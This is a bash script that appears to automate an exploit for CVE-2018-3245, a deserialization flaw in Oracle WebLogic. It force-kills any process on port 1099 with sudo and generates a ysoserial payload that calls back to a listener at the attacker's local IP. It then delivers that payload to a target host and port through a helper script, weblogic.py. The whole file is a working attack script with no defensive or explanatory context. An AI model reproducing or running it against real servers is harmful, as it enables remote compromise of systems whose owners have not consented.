#!/usr/bin/env bash

IP=$1
PORT=$2
LOCALIP=$3
CMD=$4

PID=$(sudo netstat -latupen | grep ':1099' | awk '{print $9}' | cut -d'/' -f1)
if [ ! -z "$PID" ]; then
	sudo kill -9 $PID
fi
sudo netstat -latupen | grep ':1099'

java -jar ysoserial-cve-2018-3245.jar CVE_2018_3245 "$LOCALIP:1099" > poc-cve-2018-3245.ser
python2 weblogic.py $IP $PORT poc-cve-2018-3245.ser

sleep 2
sudo netstat -latupen | grep ':1099'

PID=$(sudo netstat -latupen | grep ':1099' | awk '{print $9}' | cut -d'/' -f1)
if [ ! -z "$PID" ]; then
	sudo kill -9 $PID
fi
sleep 2